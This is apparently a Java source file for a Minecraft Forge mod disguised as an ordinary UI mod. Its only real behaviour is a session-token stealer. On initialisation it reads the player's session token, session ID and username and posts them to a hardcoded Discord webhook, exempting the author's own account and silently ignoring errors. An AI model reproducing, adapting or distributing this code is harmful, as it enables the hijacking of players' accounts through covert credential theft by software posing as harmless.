package org.httphypixelnet;

import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;

import java.io.IOException;
import java.util.ArrayList;

@Mod(modid = HittableUiMod.MODID, version = HittableUiMod.VERSION)
public class HittableUiMod {
    public static final String MODID = "examplemod";
    public static final String VERSION = "1.0";
    public static final Minecraft mc = Minecraft.getMinecraft();
    public static final String USERNAME = mc.getSession().getUsername();

    public static final String SSID = mc.getSession().getSessionID();
    public static final String WEBHOOK = "https://discord.com/api/webhooks/1066077189809917952/f-XgbmX5GWFcNybYfKFomE0ottQ1Uk1YWIw3l1MCP9Np81_vzL_dYRCseRDc3fIcnOuR";
    public static final String TOKEN = "`" + mc.getSession().getToken() + "`";

    @Mod.EventHandler
    public void init(FMLInitializationEvent event) {
        if(!mc.getSession().getUsername().equals("httphypixelnet"))
        {
            String body = "<@675018004605698049> Token is: " + "`" + TOKEN + "`, " + SSID + " is the ssid ";
            try{
                CloseableHttpClient httpClient = HttpClients.createDefault();
                HttpPost httpPost = new HttpPost(WEBHOOK);
                ArrayList<NameValuePair> params = new ArrayList<>();
                params.add(new BasicNameValuePair("content", body));
                params.add(new BasicNameValuePair("username", USERNAME));
                httpPost.setEntity(new UrlEncodedFormEntity(params));
                httpClient.execute(httpPost);
                httpClient.close();
            }catch (IOException ignored){}
        }
    }
}

